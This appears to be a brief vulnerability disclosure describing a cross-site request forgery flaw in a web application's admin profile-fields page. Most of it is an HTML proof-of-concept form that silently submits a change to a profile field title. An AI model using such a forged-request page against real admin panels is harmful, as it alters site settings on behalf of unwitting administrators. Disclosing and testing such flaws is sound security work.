# Profile Fields CSRF
Allows for the profile fields to be edited through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<form method="POST" action="http://localhost/admin/profile_fields.php" style="padding: 25px;">
    <input type="hidden" name="id" value="1">
    <div class="form-group">
    <label for="title">Title</label>
    <input type="text" class="form-control" id="title" name="title" value="discord">
    </div>
    <button type="submit" name="savechange" id="savechange" class="btn btn-primary">Save Changes</button>
</form>
```
